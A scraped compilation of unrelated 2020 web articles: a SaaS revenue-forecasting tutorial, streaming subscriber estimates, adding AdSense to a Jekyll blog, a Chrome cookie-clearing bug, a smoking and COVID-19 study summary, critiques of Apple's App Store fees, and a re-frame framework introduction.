      <p>
        As a quick aside, there are many other ways to go about forecasting churn, like analyzing cohort behavior over time, to potentially get to a more accurate projection. Our view is that it’s only worth getting into that level of detail once the company has reached a certain level of maturity, likely in the range of several thousand subscribers. Before then though, the simpler monthly churn rate is the approach we most often recommend because it’s easier to calculate, easier to forecast, and it prevents you from getting bogged down in unnecessary detail and drawing conclusions from too sparse of data.
        </p>

      

       <div>
        <!-- <br /><br /> --><p>
        So now we have a simple framework for forecasting our number of active subscribers for any period. Next we add in our assumption on revenue per month, and multiply that by our # of active subscribers to get total revenue per month.
        </p><p>
        We'll add in a calculation for ARR (Annual Recurring Revenue) here as well by simply multiplying monthly revenue by 12.
        </p></div>

              <span>
                Monthly Subscription Revenue = [ Ending # of Active Subscribers ] * [ Avg Revenue / Subscriber ]
              </span>
            </p>
        </div>
      </div>

      <p>
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. 
        </p>

      

      <div>
        <!-- <br /><br />
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say that charge is $5k.
        <br /><br /> --><p>
        Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say we charge $5k. You can see that logic added in below, and we've also totaled up these two revenue lines (Subscription Revenue and Implementation Revenue) to get Total Revenue. 
        </p></div>

        <div>

              <span>
                Note that our ARR calculation here does not include the new non-recurring services revenue.
              </span>
            </p>
        </div>
      </div>

      

      <div>
        <!-- <br /><br /> --><p>
        We could also get a bit more sophisticated about how we forecast our number of new customers each month instead of simply hard-coding our new customer count at 10 per month. Let’s say our primary customer acquisition method is converting visitors from our website. For any set of website visitors, some of them contact us to become a lead, and then some of those leads convert into paying customers.
        </p><p>
        For starting baseline assumptions, let's say we get 1,000 website visitors per month, 2% of those convert into leads, 20% of our leads convert into paying customers, and our marketing efforts drive an increase in website visitors by 1,000 per month.
        </p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>Let me tell you a pet peeve of mine. It’s folks citing how many Amazon Prime Video subscribers Amazon has.<span>&nbsp;</span></p>
<p>Because they don’t know.</p>
<p>What you know, or have been told once, is how many Amazon Prime subscribers there are. With Prime comes access to Prime Video. We don’t know how many members actually use that service or, more importantly, know how many value the service enough to pay for it on a recurring basis. (What a subscription is, by definition.)</p>
<p>But here’s what’s crazier: we don’t even know how many Amazon Prime subscribers there are by country. They could have 50 million US Prime members…or 125 million. Literally know one knows. (In fact, we haven’t gotten an update on Prime membership since January.)</p>
<p>This is indicative of a larger phenomenon of the “streaming wars”. The streamers have barely told us how well they are doing. By my estimates, only 4 of the 12 biggest streamers have shared actual US subscriber numbers! (Hulu, ESPN+, HBO Max and Starz)</p>
<p>That’s right, due to non-disclosure, global-only numbers, or definitional craziness, we really can’t compare the streamers to each other in the United States.</p>
<p>Well no more!</p>
<p>I’ve decided to fix this glaring mistake. What I’m going to do is provide the EntStrategyGuy Definitive Estimate for all the major streamers US subscriber base. Today, I’ll provide my table, chart and some notes, then tomorrow I’ll provide the longer, gory details. First, here’s the chart:</p>

<p><b>About That Headline</b></p>
<p>If the internet weren’t a cesspool of clickbait, I could have just explained what this article is, “My estimate of US subscribers for the streamers.” But that doesn’t get the clicks. A flashy headline on Netflix? That does.</p>
<p>Tomorrow, like I will say multiple times, is where I’ll really provide insights into this process and data. For now, though, if you have one takeaway, it should be that the streaming wars are messy. They are filled with nuance. The more that someone online pushes a simplistic narrative (Netflix has already won; Disney+ will kill Netflix; TV is dead) the less you should listen. There are no simple narratives.</p>
<p>So my headline is 100% true, and building this chart makes that clear. When it comes to one single streamer in the United States, Netflix is about twice as far ahead as its nearest competitors. Really, they are in the first tier by themselves. Then there is a second tier of services with about 35 million subscribers (Disney+, Hulu, HBO Max and Prime Video). Then a third tier of folks trying to break into that second tier (Apple, Peacock, Starz, CBS, Showtime, maybe AMC+).<span>&nbsp;</span></p>
<p>Yet, this look is in many ways a backwards looking view. The three oldest services happen to be the three oldest. The difficulty is forecasting what comes next. If we’re looking at growth, Netflix at the top was flat last quarter and down earlier in the year. And likely would have stayed that way all year in America except for Covid. Meanwhile, can the new streamers add subscribers? I think they can.</p>
<p>At least now, we/I have a common fact set to evaluate the United States performance of the streamers.</p>
<p><b>Quick FAQs</b></p>
<p>– What about global? I’m just focusing on the United States since many of these streamers are US-only. And we have the best data for this country. As the streaming wars continue, though, I’ll do a similar look for worldwide. (Though comparing global numbers to US only numbers is not a good method to do that.)</p>
<p>– How did you get that Amazon number? It’s an estimate of an estimate of an estimate, which makes it a guess. I’ll explain tomorrow.</p>
<p>– Why didn’t “smaller streamer TBD” make the list? I set the cut off at roughly 2 million subscribers. Anything smaller would have made the chart difficult to read. Again, I’ll explain my rules tomorrow.</p>
<p>– What if you disagree? Well, tomorrow I’ll explain how I calculated each one, so if you want to adjust the estimates you can. That will allow you to disagree, but within the right zone of possible answers.</p>
<p>– [From Corporate PR] You got our numbers all wrong! One, if you don’t put them out, then no I didn’t. If any company wants to correct my math, send me three years of financial data and I’ll happily provide an exclusive update.</p>

November 18, 2020 | https://ncona.com/2020/11/monetizing-a-jekyll-blog-with-adsense/ | <a href="https://web.archive.org/web/*/https://ncona.com/2020/11/monetizing-a-jekyll-blog-with-adsense/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I’ve been writing this blog for a while and I recently thought it would be nice if it could help pay for the servers I use for my other projects. At the time of this writing, this blog gets around 25,000 views per month, which is not much, but might be enough to pay for a couple of virtual machines (Hopefully. I’ll know more after I have ads running for some time).</p>

<p>Since this blog is built with Jekyll, I’m going to show how to add Adsense to similar blogs.</p>

<h2 id="creating-a-site-in-adsense">Creating a site in Adsense</h2>

<p>Before we can start adding ads to our site, we need to tell Google that the site is ours. To do that we need click <code>Add site</code> on the <code>Sites</code> section:</p>

<p><a href="https://ncona.com/images/posts/adsense-add-site.png"><img src="https://ncona.com/images/posts/adsense-add-site.png" alt="Adsense add site"></a></p>

<p>We will then get a code that we should put in the <code>&lt;head&gt;</code> of our website. The code looks something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>&lt;script </span><span>data-ad-client=</span><span>"ca-pub-12345678987654321"</span> <span>async</span> <span>src=</span><span>"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"</span><span>&gt;&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<!--more-->

<p>Depending on the Jekyll theme we are using, we might have different layouts for different types of pages. For example, I have a layout for my main page and a different one for a single article page. We need to add the code above to all the pages where we want to show ads.</p>

<p>After adding the code, we need to wait a few days for the registration to complete.</p>

<h2 id="auto-ads">Auto Ads</h2>

<p>Adsense has an <code>Auto ads</code> feature that let’s Google choose the best places to show ads in a page. This option is easy to implement but might result in showing ads in places that are very disruptive for users.</p>

<p>To enable it, we need to <code>edit</code> our site:</p>

<p><a href="https://ncona.com/images/posts/adsense-edit-site.png"><img src="https://ncona.com/images/posts/adsense-edit-site.png" alt="Adsense edit site"></a></p>

<p>This takes us to a page where we can customize the ads we want to show for both desktop and mobile:</p>

<p><a href="https://ncona.com/images/posts/adsense-auto-ads.png"><img src="https://ncona.com/images/posts/adsense-auto-ads.png" alt="Adsense auto ads"></a></p>

<p>There are 3 types of ads offered at the time of this writing:</p>

<ul>
  <li>In-page - Shows mixed with the page content</li>
  <li>Anchor - Pop-up that can be dismissed</li>
  <li>Vignette - Full screen ad shown when transitioning between pages</li>
</ul>

<p>By looking at where the ads would be placed I decided I didn’t like having Google decide where to put the ads. If you decide to go for this option, I suggest to stick to <code>in-page</code> ads since the other 2 are very disruptive.</p>

<p>After enabling <code>auto ads</code>, it might take a couple of hours to start working on our site.</p>

<h2 id="ad-units">Ad units</h2>

<p>A way to have more control over where we put our ads is by using <code>ad units</code>:</p>

<p><a href="https://ncona.com/images/posts/adsense-by-ad-unit.png"><img src="https://ncona.com/images/posts/adsense-by-ad-unit.png" alt="Adsense by ad unit"></a></p>

<p><code>Display ads</code> are a good option that works for both mobile and desktop. To create a unit we just need to give it a name, choose the orientation and click <code>Create</code>:</p>

<p><a href="https://ncona.com/images/posts/adsense-create-unit.png"><img src="https://ncona.com/images/posts/adsense-create-unit.png" alt="Adsense create unit"></a></p>

<p>We will then be given a piece of code similar to the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td><pre><span>&lt;script </span><span>async</span> <span>src=</span><span>"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"</span><span>&gt;&lt;/script&gt;</span>
<span>&lt;!-- ncona-ad-unit --&gt;</span>
<span>&lt;ins</span> <span>class=</span><span>"adsbygoogle"</span>
     <span>style=</span><span>"display:block"</span>
     <span>data-ad-client=</span><span>"ca-pub-12345678987"</span>
     <span>data-ad-slot=</span><span>"1234567897"</span>
     <span>data-ad-format=</span><span>"auto"</span>
     <span>data-full-width-responsive=</span><span>"true"</span><span>&gt;&lt;/ins&gt;</span>
<span>&lt;script&gt;</span>
     <span>(</span><span>adsbygoogle</span> <span>=</span> <span>window</span><span>.</span><span>adsbygoogle</span> <span>||</span> <span>[]).</span><span>push</span><span>({});</span>
<span>&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can then create an include for this snippet (<code>_includes/adsense.html</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td><pre>{% if jekyll.environment == "production" %}
<span>&lt;script </span><span>async</span> <span>src=</span><span>"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"</span><span>&gt;&lt;/script&gt;</span>
<span>&lt;!-- ncona-ad-unit --&gt;</span>
<span>&lt;ins</span> <span>class=</span><span>"adsbygoogle"</span>
     <span>style=</span><span>"display:block"</span>
     <span>data-ad-client=</span><span>"ca-pub-12345678987"</span>
     <span>data-ad-slot=</span><span>"1234567897"</span>
     <span>data-ad-format=</span><span>"auto"</span>
     <span>data-full-width-responsive=</span><span>"true"</span><span>&gt;&lt;/ins&gt;</span>
<span>&lt;script&gt;</span>
     <span>(</span><span>adsbygoogle</span> <span>=</span> <span>window</span><span>.</span><span>adsbygoogle</span> <span>||</span> <span>[]).</span><span>push</span><span>({});</span>
<span>&lt;/script&gt;</span>
{% endif %}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And then add this include wherever we want to show an ad. This is how my post layout looks:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

 <span>&lt;/div&gt;</span>

  <span>&lt;div</span> <span>class=</span><span>"entry"</span><span>&gt;</span>
    {{ content }}
  <span>&lt;/div&gt;</span>

  <span>&lt;span&gt;</span>[
    {% for tag in page.tags %}
      {% capture tag_name %}{{ tag }}{% endcapture %}
      <span>&lt;a</span> <span>href=</span><span>"/tag/{{ tag_name }}/"</span><span>&gt;&lt;code</span> <span>class=</span><span>"highligher-rouge"</span><span>&gt;&lt;nobr&gt;</span>{{ tag_name }}<span>&lt;/nobr&gt;&lt;/code&gt;</span><span>&amp;nbsp;</span><span>&lt;/a&gt;</span>
    {% endfor %}
  ]<span>&lt;/span&gt;</span>

  {% include adsense.html %}
  {% include share-bar.html %}
  {% include related-posts.html %}
  {% include disqus.html %}
<span>&lt;/article&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ads don’t have any margins by default, so they look a little crowded.</p>

<p><a href="https://ncona.com/images/posts/adsense-no-margin.png"><img src="https://ncona.com/images/posts/adsense-no-margin.png" alt="Adsense no margin"></a></p>

<p>We can add some margins with css (<code>style.scss</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>.adsbygoogle</span> <span>{</span>

<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="paginate">Paginate</h2>

<p>I use <a href="https://jekyllrb.com/docs/pagination/">jekyll-paginate</a> to generate a paginated listing of all my posts. My index page looks something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

  <span>&lt;/article&gt;</span>
  {% endfor %}
...
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I want to show ads on this page, but I don’t want to show an ad for each post.</p>

<p>Since each of my pages contains a maximum of 10 posts, I’m going to show an ad after the second post and another one after the sixth:</p>

<p>Because I’m using the same snippet (<code>adsense.html</code>) in both places, they will always show the same ad. To add a little variety we can create a new ad unit from the Google Adsense console and create a new snippet for it. We can then use a different snippet for each position:</p>

    {% include adsense-2.html %}
    {% endif %}

  <span>&lt;/article&gt;</span>
  {% endfor %}
...
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We will now see a different ad on each position.</p>

<h2 id="adstxt">Ads.txt</h2>

<p>In our adsense console we might be getting a message talking about <code>ads.txt</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>Earnings at risk - You need to fix some ads.txt file issues to avoid severe impact to your revenue.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This basically means that we need to create an <code>ads.txt</code> file and upload it to our site. This file tells the browser which advertisers are allowed to show content on our site. If we click the <code>Fix it</code> link next to the alert, we will have the option to download a file. We need to upload this file and make it available at <code>&lt;ourdomain&gt;/ads.txt</code>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this article I showed how we can start showing ads in a Jekyll site to make some money from a blog. I personally don’t like having Google choose where to put ads, so I showed how to place our ads manually using <code>ad units</code>.</p>

	<h4>A programmer named <a href="https://lapcatsoftware.com/articles/chrome-google.html" target="_blank" rel="noopener noreferrer">Jeff Johnson</a> recently discovered that enabling the “Clear cookies and site data when you quit Chrome” meant Google Search and YouTube cookies were not deleted, and exempt from this rule.</h4>
<p>He found that the only way to include Google and YouTube cookies for clearing is to specifically add <code>google.com</code> and <code>youtube.com</code> to <em>sites that can never use cookies</em> – it is not made obvious to the user that Google’s own services are exempt from the cookie clearing rule by default. <em>(<a href="https://lapcatsoftware.com/articles/chrome-google.html" target="_blank" rel="noopener noreferrer">source</a>)</em></p>
<p>Furthermore, <a href="https://www.independent.co.uk/life-style/gadgets-and-tech/google-privacy-chrome-youtube-search-bug-b1180705.html" target="_blank" rel="noopener noreferrer"><em>The Independent</em></a> investigated this issue and found similar results.</p>
<p>Google was made aware of this issue, and a Google spokesperson issued the following statement:</p>
<blockquote><p>“We are aware of a bug in Chrome that is impacting how cookies are cleared on some first-party Google websites. We are investigating the issue, and plan to roll out a fix in the coming days.” (<a href="https://www.theregister.com/2020/10/19/google_cookie_wipe/" target="_blank" rel="noopener noreferrer">source</a>)<em><br>
</em></p></blockquote>
<hr>
<p><em><strong>Author’s Note:</strong> Google has a <a href="https://en.wikipedia.org/wiki/Privacy_concerns_regarding_Google" target="_blank" rel="noopener noreferrer">long history of privacy violations</a>, which is one of the primary reasons I recommend finding ways to become less reliant on their services. A good first step would be to replace Chrome with <a href="https://www.mozilla.org/en-US/firefox/new/?redirect_source=firefox-com" target="_blank" rel="noopener noreferrer">Firefox</a>, and from there, looking to replace Google Search with <a href="https://duckduckgo.com/" target="_blank" rel="noopener noreferrer">DuckDuckGo</a> or <a href="https://startpage.com/" target="_blank" rel="noopener noreferrer">Startpage</a>.</em></p>

But the reasons why have not been entirely clear.</p><p>To help understand how smoking affects SARS-CoV-2 infection on a cellular and molecular level, Dr. Brigitte Gomperts partnered with co-senior authors Vaithilingaraja Arumugaswami, an associate professor of molecular and medical pharmacology, and Kathrin Plath, a professor of biological chemistry, to recreate what happens when the airways of a current smoker are infected with SARS-CoV-2. </p><p>The team utilized a platform known as an air–liquid interface culture, which is grown from human airway stem cells and closely replicates how the airways behave and function in humans. The airways, which carry air breathed in from the nose and mouth to the lungs, are the body’s first line of defense against airborne pathogens like viruses, bacteria and smoke.</p><p>“Our model replicates the upper part of the airways, which is the first place the virus hits,” said Gomperts, a professor pulmonary medicine and member of the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcancer.ucla.edu%2F&amp;t=M2JlMGZjOGFkMzI1NzZkMThkZTM2ZDkwMGI0M2EyYmFiMjkyODAyYSxUUDc3ZTRVMQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635162930879594496%2Fsmoking-and-covid19&amp;m=0&amp;ts=1605920193">UCLA Jonsson Comprehensive Cancer Center</a>. “This is the part that produces mucus to trap viruses, bacteria and toxins and contains cells with finger-like projections that beat that mucus up and out of the body.”</p><p>The air–liquid interface cultures used in the study were grown from airway stem cells taken from the lungs of five young, healthy, nonsmoking tissue donors. To replicate the effects of smoking, the researchers exposed these airway cultures to cigarette smoke for three minutes per day over four days.</p><p>“This type of model has been used to study lung diseases for over a decade and has been shown to mimic the changes in the airway that you would see in a person who currently smokes,” said Gomperts, who is also vice chair of research in pediatric hematology-oncology at the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.uclahealth.org%2Fmattel%2Fcdi%2Fabout-ucla-childrens-discovery-and-innovation-institute&amp;t=MjM1ZTg5NDljM2E1ZDQzYTJkYmEyZjI5YTc0MWI3ZTRmMjNkOWM3ZCxUUDc3ZTRVMQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635162930879594496%2Fsmoking-and-covid19&amp;m=0&amp;ts=1605920193">UCLA Children’s Discovery and Innovation Institute</a>.</p><figure data-orig-width="1152" data-orig-height="768"><img src="https://64.media.tumblr.com/23a2b89187c156f902af6da92869f5a3/de893e45c0e70294-11/s1280x1920/024d373e1326ec10e438a7c252972f0b998c1464.jpg" alt="image" data-orig-width="1152" data-orig-height="768" width="1152" height="768"></figure><p><i>Image:&nbsp;Microscopic images of human stem cell–derived airway tissue models with cell nuclei (blue) and SARS-CoV-2–infected cells (green); tissue exposed to cigarette smoke (right) had 2 to 3 times more infected cells than non-exposed tissue (left).

Interferons play a critical role in the body’s early immune response by triggering infected cells to produce proteins to attack the virus, summoning additional support from the immune system, and alerting uninfected cells to prepare to fight the virus. Cigarette smoke is known to reduce the interferon response in the airways.</p><p>“If you think of the airways like the high walls that protect a castle, smoking cigarettes is like creating holes in these walls,” Gomperts said. “Smoking reduces the natural defenses and that allows the virus to set in.” </p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnewsroom.ucla.edu%2Freleases%2Fhow-smoking-worsens-covid-infection&amp;t=NjNkZmQzYTYyZjYzZGVkZDBhNTczZTEwMGUwMjliNWY2OWRhZjM4YSxUUDc3ZTRVMQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635162930879594496%2Fsmoking-and-covid19&amp;m=0&amp;ts=1605920193">UCLA Health</a></b></p><p><b>Full study:</b>&nbsp;“Direct exposure to SARS-CoV-2 and cigarette smoke increases infection severity and alters the stem cell-derived airway repair response”, <i>Cell Stem Cell</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.stem.2020.11.010&amp;t=Y2NkNjc2ZjcyYWMyYzRlOTQyMjA2NGVjNWY4MzZlM2JjZGRkYmMyZixUUDc3ZTRVMQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635162930879594496%2Fsmoking-and-covid19&amp;m=0&amp;ts=1605920193">https://doi.org/10.1016/j.stem.2020.11.010</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/632175500576653312/blood-test-covid19-infection-prediction">Novel blood test predicts which COVID-19 patients will develop severe infection</a></p>

  <article>
	<p>From <em><a href="https://www.apple.com/newsroom/2020/11/apple-announces-app-store-small-business-program/">Apple announces App Store Small Business Program</a></em> (emphasis mine):</p>

<blockquote>
<p>Apple today announced an industry-leading new developer program to accelerate innovation and help small businesses and independent developers propel their businesses forward with the next generation of groundbreaking apps on the App Store. The new App Store Small Business Program will benefit the vast majority of developers who sell digital goods and services on the store, providing them with a reduced commission on paid apps and in-app purchases. <strong>Developers can qualify for the program and a reduced, 15 percent commission if they earned up to $1 million in proceeds during the previous calendar year.</strong></p>
</blockquote>

<p>This is certainly an improvement over the current state of affairs (where Apple takes 30% off the top from everybody¹). However, the revenue limit that Apple has set for this program seems pretty arbitrary and pretty low. A million dollars sure seems like a lot of money at first blush and I’m sure that’s why they chose it. Indeed, it certainly is a lot to a solo indie developer or a very small team. However, it is surely not a lot of money for a small business that employs more than a few people to build software.</p>

<p>A software company in the US with one million dollars in annual gross revenue would struggle to support 10-12 employees outside of major tech markets. In places like San Francisco, New York City, or Austin, it would be closer to 5-7 employees. That’s hardly a big business that is in a position to fork over another 15% of its revenue in platform taxes to a company worth some <em>two trillion dollars</em> ².</p>

<p>Apple should just cut their tax for everyone. Taking even a 15% cut from developers whose products create enormous value for iOS—and therefore Apple’s highly lucrative hardware products—is pretty egregious. I’m not sure a change this anemic is going to do much to tamp down the growing developer discontent Apple is confronting.</p>

<hr>

<ol>
<li>Well, everybody who isn’t important enough to <a href="https://www.theverge.com/2020/4/3/21206400/apple-tax-amazon-tv-prime-30-percent-developers">negotiate special terms</a>. The “standard” 30% cut will now only apply to the App Store middle class: too successful for this new program, too small to negotiate a special deal.</li>
<li>About $2,010,000,000,000 as I write this.</li>
</ol>

<p>A framework for building Modern Web Apps in ClojureScript. It leverages React, via <a href="http://reagent-project.github.io/">Reagent</a>.</p>
<p>McCoy might report "It's MVC, Jim, but not as we know it".  And you would respond 
"McCoy, you trouble maker, why even mention an OO pattern? 
re-frame is a <strong>functional framework</strong>."</p>
<p>So, it is about <code>data</code>, and the <code>functions</code> 
which transform that data.  And, because it is a <strong>reactive framework</strong>, <code>data</code> coordinates 
<code>functions</code>, not the other way around.</p>
<p>Indicatively, re-frame's tag line is: <strong>derived values, flowing</strong>. </p>
<h2 id="why-should-you-care">Why Should You Care?<a href="#why-should-you-care" title="Permanent link">¶</a></h2>
<p>Perhaps:</p>
<ol>
<li>You want to develop a modern web application using ClojureScript.</li>
<li>You want to maximise developer productivity by writing <a href="https://medium.com/dailyjs/a-realworld-comparison-of-front-end-frameworks-2020-4e50655fe4c1">fewer lines of code</a>. You want a simple dynamic process that you can simulate in your head. And you want a clean approach to effects and state management.</li>
<li>You are curious about the benefits of <strong><em>data-oriented design</em></strong>.</li>
<li>You are a refugee from technical churn, seeking stability and productivity.
    For six years, ClojureScript, Reagent and re-frame have barely changed. No need. Still cutting edge.</li>
<li>You want to see how <code>reactive programming</code>, <code>functional programming</code> and <code>immutable data</code>
    combine in a language that genuinely embraces those paradigms.</li>
<li>You're taking a <a href="http://www.eli.sdsu.edu/courses/fall15/cs696/index.html">Functional Design and Programming course</a> at San Diego State University
    and you have a re-frame assignment due.  You've left the reading a bit late, right?</li>
<li>You seek a better Redux, Elm, Cycle.js or Pux. In this space, re-frame is very old, 
    hopefully in a Gandalf kind of way.
    Designed in late 2014, it slightly pre-dates the official Elm Architecture,
    although thankfully we picked up <code>foldp</code> ideas from early Elm games. 
    Our main inspiration was the
    Clojure projects <a href="https://github.com/pedestal/pedestal-app">Pedestal App</a>, <a href="http://hoplon.io/">Hoplon</a> and <a href="https://github.com/swannodette/om">Om</a>. Since then,
    re-frame has pioneered ideas like event handler middleware,
    coeffect accretion, and de-duplicated signal graphs.</li>
<li>
<p>Which brings us to the most important point: <strong>re-frame is impressively buzzword compliant</strong>. It has reactivity,
    unidirectional data flow, pristinely pure functions,
    interceptors, coeffects, conveyor belts, algebraic effects, statechart-friendliness 
    and claims an immaculate hammock conception. All while being both simple and easy. There's also a charming
    xkcd reference (soon) and a hilarious, insiders-joke T-shirt,
    ideal for conferences (in design).  </p>
<p>What could possibly go wrong?</p>
</li>
</ol>
<h2 id="it-is-mature">It Is Mature<a href="#it-is-mature" title="Permanent link">¶</a></h2>
<p>re-frame was released in early 2015, and has since 
<a href="https://www.fullcontact.com/">been</a> successfully
<a href="https://www.nubank.com.br/">used</a> by
<a href="http://open.mediaexpress.reuters.com/">many</a> a 
<a href="https://rokt.com/">companies</a> and
individuals to build complex apps, many running beyond 40K lines of
ClojureScript.</p>
<p><img src="https://day8.github.io/re-frame/images/scale-changes-everything.jpg"></p>
<p><strong>Scale changes everything.</strong> Frameworks
are just pesky overhead at small scale - measure them instead by how they help
you tame the complexity of bigger apps, and in this regard re-frame has
worked out well. Some have been effusive in their praise.</p>
<p>And, yes, re-frame is fast, straight out of the box. And, yes, it has 
a good testing story (unit and behavioural). And, yes, it works with 
tools like figwheel or shadow-cljs to create
a powerful hot-loading development story. And, yes, it has 
fun specialist tooling, and a community,
and useful 3rd party libraries.</p>

</blockquote>
<p>For decades, developers were able to create and distribute their software, whether free or for a fee, to anyone with a PC or laptop. There was no gatekeeper deciding who was in or out, and there was no requirement that they hand over a significant percentage of their revenue to the device maker.</p>
<p>Video game consoles were the obvious exception to this, with the claim that they were specialized devices and, therefore, closed ecosystems. But personal computing was open, and that was an important catalyst for innovation for a long time.</p>
<p>That changed with the introduction of Apple's app store on iOS. Developers had to be approved by Apple, and had to agree to use Apple as their sole payment processor, to the tune of $99/year and 30% of their revenue. For contrast, payment processors at the time were charging around 2.9% and $0.30/transaction. That's a massive difference in and of itself.</p>
<blockquote>
<p>The 30% number was based on what video game consoles were charging developers.</p>
</blockquote>
<h2 id="apples-original-rationale">Apple's original rationale</h2>
<p>Apple's argument for the iPhone being a closed ecosystem was that a phone is a specialized device because its primary function is to make phone calls, and that primary function must be protected against rogue software that may disrupt its ability to make those calls.</p>
<p>Apple's argument that the 30% fee was fair was that it takes manpower to review and approve apps to be listed on their store.</p>
<h2 id="ripples-into-other-app-stores">Ripples into other app stores</h2>
<p>The issue grew bigger as Google implemented similar requirements and fee structures on the Android app store, and pretty much every app store from Steam to Samsung Galaxy followed suit.</p>
<p>Now that Microsoft and Apple have introduced app stores on Windows and macOS, they plan to slowly erode our freedom on PCs too so that they can reap the same financial benefits on our labour on all computing platforms (save for open source operating systems like Linux). Apple has since added warning messages discouraging users not to install third party software that hasn't paid for Apple's signature of approval. These warnings are getting more and more alarming with each OS upgrade, causing users to fear installing third party software through other, traditional means.</p>
<p>This needs to be stopped now because device makers are making the case that future devices like VR and AR headsets are also specialized devices and so they too should be subject to the same closed ecosystem and payment processing restrictions, which is simply untrue.</p>
<p>If an AR device replaces your PC, it's a generalized computing device, plain and simple.</p>
<h2 id="phones-are-not-specialized-computing-devices">Phones are not specialized computing devices</h2>
<p>Making phone calls was the sole function of a telephone, but a mobile phone is a powerful computer that can perform a wide range of functions. The new iPhone 12 Pro has built-in Lidar, a total of 4 cameras, GPS, and many other features that extend far being making phone calls.</p>
<p>What was once a primary feature is now just one of thousands, and potentially one of its least important features as we have dozens or more options for voice, video, and text-based messaging available to us. Many young people would probably be just fine on an iPod Touch that doesn't make calls at all, and many probably wouldn't know the difference.</p>
<p>Phones are general computing devices, and as such, should not be maintained as closed ecosystems. This doesn't benefit users, many of whom are also developers themselves, because it limits our freedom on both sides of the equation. General computing platforms should be protected from such predatory practices by manufacturers through strong government regulations.</p>
<h2 id="the-fee-isnt-the-issue-the-requirement-to-pay-is">The fee isn't the issue, the requirement to pay is</h2>
<p>Tying your right distribute an app that you developed independently of the hardware maker to the requirement to use their payment processor is anti-competitive because it means that every developer benefits the hardware maker while the hardware maker provides little more than a gatekeeper function and a small amount of file storage for their release builds.</p>
<p>How can any indie developer hope to compete with the likes of Apple or Google or Microsoft when every sale they make gives 15% of their profits over to their competition? And if they make more than $1m, it goes back up to 30%. That's a huge disparity that serves to protect the interests of the hardware maker at the expense of businesses everywhere.</p>
<p>If there was a hard cost for Apple and others to review and approve apps, then that should be charged up-front and not as a percentage of profit. Developers should be free to choose the payment processing service that best serves their needs, whether that's Stripe or Paypal or Apple's built-in offering. Apple's payment processor should be chosen because it's better, not because you have no other choice.</p>
<h2 id="disproportionate-profits">Disproportionate profits</h2>
<p>Since the cost of the review process and hosting are the justification for the payment processing fees, a good way to tell if they're in line with each other is to look at Apple's profits on the app store. In 2019, Apple generated about <a href="https://www.cnbc.com/2020/01/07/apple-app-store-had-estimated-gross-sales-of-50-billion-in-2019.html" target="_blank" rel="nofollow noopener noreferrer">$50bn in sales on the iOS app store</a>, with their take being about <strong>$15bn in profit</strong>.</p>
<p>Does it really cost Apple anywhere close to $15bn/year to maintain the app store's review process and hosting infrastructure?</p>
<h2 id="this-makes-some-business-models-unfeasible">This makes some business models unfeasible</h2>
<p>Some business models, like establishing a marketplace for content creators to share their work with each other, become unfeasible when 15-30% off the top goes straight to the device maker. Many businesses operate with profit margins well under 30% or even 15%. Amazon is widely known for maintaining a 1% profit margin across their entire business as a strategic advantage to be able to undercut everyone else.</p>
<p>Other payment processors are essentially locked out of these ecosystems entirely, which is unfair and anti-competitive against them. I bet Stripe would love to be able to provide a better mobile payment option – their core business – without Apple being such a significant portion of the sale, thereby negating any benefit that Stripe on its own can differentiate itself with.</p>
<h2 id="this-is-not-just-a-problem-for-developers">This is not just a "problem for developers"</h2>
<p>I've seen many comments on sites like Hacker News and MacRumours that this isn't a problem users should care about and that developers should essentially stop whining or take their software elsewhere. But this also limits the choices users have, and it limits the types of apps they get to benefit from. This limitation won't be felt directly, because you don't feel the absence of something you never knew you could have. <em>You don't know what you don't know.</em></p>
<p>Stifling innovation isn't good for anyone, and as more and more people become software developers, this really just hurts the small guys. The indies who are more similar in size and need to average consumers than the likes of tech giants like Apple or Google. Indie developers need protection from monopolistic and anti-competitive practices from larger players in the market through strong government regulation, not a discount on their first $1m in sales.</p>
